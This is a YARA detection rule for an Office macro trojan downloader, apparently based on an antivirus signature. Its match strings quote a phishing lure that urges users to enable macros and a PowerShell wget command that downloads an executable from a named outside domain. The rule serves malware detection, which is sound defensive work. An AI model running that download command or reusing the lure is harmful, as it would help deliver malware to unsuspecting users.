
rule TrojanDownloader_O97M_EncDoc_PDH_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.PDH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {50 6c 65 61 73 65 20 43 6c 69 63 6b 20 22 45 6e 61 62 6c 65 20 4d 61 63 72 6f 73 22 20 54 6f 20 53 68 6f 77 20 54 68 65 20 46 75 6c 6c 20 44 6f 63 75 6d 65 6e 74 21 } //1 Please Click "Enable Macros" To Show The Full Document!
		$a_01_1 = {50 4f 57 45 52 73 68 45 6c 6c 2e 45 78 45 20 77 47 65 74 20 68 74 74 70 73 3a 2f 2f 73 75 70 65 72 70 6f 78 2e 63 6f 6d 2e 62 72 2f 43 72 6f 73 2f 75 6c 7a 68 5a 6c 37 4f 4e 73 54 49 61 64 55 2e 65 78 65 } //1 POWERshEll.ExE wGet https://superpox.com.br/Cros/ulzhZl7ONsTIadU.exe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}